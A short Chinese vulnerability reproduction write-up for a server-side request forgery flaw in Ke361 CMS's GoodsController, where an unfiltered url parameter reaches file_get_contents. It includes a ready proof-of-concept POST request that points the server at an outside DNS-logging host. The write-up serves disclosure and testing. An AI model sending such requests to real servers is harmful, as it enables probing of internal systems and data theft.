# Ke361 GoodsController.class.php SSRF漏洞

## 漏洞描述

Ke361 GoodsController.class.php URL参数存在 SSRF漏洞，通过漏洞可以获取敏感信息

## 漏洞影响

<a-checkbox checked>Ke361</a-checkbox></br>

## 环境搭建

<a-checkbox checked>https://gitee.com/jcove/ke361</a-checkbox></br>

## 漏洞复现

CMS产品页面

![img](../../../.vuepress/public/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35.png)

存在漏洞的文件为 `Application/Home/Controller/GoodsController.class.php`

![img](../../../.vuepress/public/img/1634173817836-6c70b428-ad33-4f61-9c5f-94728c906ff2.png)

URL参数无任何过滤，传入 file_get_contents函数，造成SSRF漏洞，构造请求

```php
POST /index.php?s=/Goods/ajGetGoodsDetial
 
url=http://6si2gt.dnslog.cn
```

![img](../../../.vuepress/public/img/1634173848355-4f9cb3d2-7e5e-4b6d-8ca7-c7fbacb844e8.png)

![img](../../../.vuepress/public/img/1634173865625-05a6c6ce-d427-498e-80c0-ef8b6ec232a3.png)